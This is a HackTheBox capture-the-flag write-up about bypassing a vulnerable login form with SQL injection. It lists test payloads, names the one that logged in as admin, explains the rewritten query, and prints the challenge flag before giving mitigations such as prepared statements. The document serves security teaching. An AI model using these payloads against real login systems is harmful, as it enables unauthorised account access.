# SQL Injection in Login Portal

**Platform:** HackTheBox  
**Difficulty:** Medium  
**Category:** Web  
**Date:** November 2024

---

## Challenge Description

A web application with a vulnerable login form that allows SQL injection attacks to bypass authentication.

## Reconnaissance

First, I examined the login page source code and noticed the form was directly concatenating user input into SQL queries.

```html
<form action="/login" method="POST">
  <input type="text" name="username">
  <input type="password" name="password">
</form>
```

## Exploitation

### Step 1: Testing for SQL Injection

I tested basic SQL injection payloads:

```sql
' OR '1'='1
admin' --
' OR 1=1--
```

### Step 2: Bypassing Authentication

The following payload successfully bypassed the login:

```sql
Username: admin' OR '1'='1' --
Password: anything
```

This works because the SQL query becomes:

```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' -- ' AND password='anything'
```

The `--` comments out the rest of the query, and `'1'='1'` is always true.

### Step 3: Flag Extraction

After logging in as admin, I navigated to the dashboard and found the flag:

```
HTB{sql_1nj3ct10n_1s_d4ng3r0us}
```

## Mitigation

To prevent this vulnerability:

1. **Use Prepared Statements** - Never concatenate user input directly
2. **Input Validation** - Sanitize and validate all user inputs
3. **Least Privilege** - Database users should have minimal permissions
4. **WAF** - Implement a Web Application Firewall

## Tools Used

- Burp Suite
- SQLMap
- Browser Developer Tools

## Key Takeaways

- Always test for SQL injection in login forms
- Comment characters (`--`, `#`) are crucial for bypassing authentication
- Modern frameworks with ORMs prevent this by default

---

**Flag:** `HTB{sql_1nj3ct10n_1s_d4ng3r0us}`
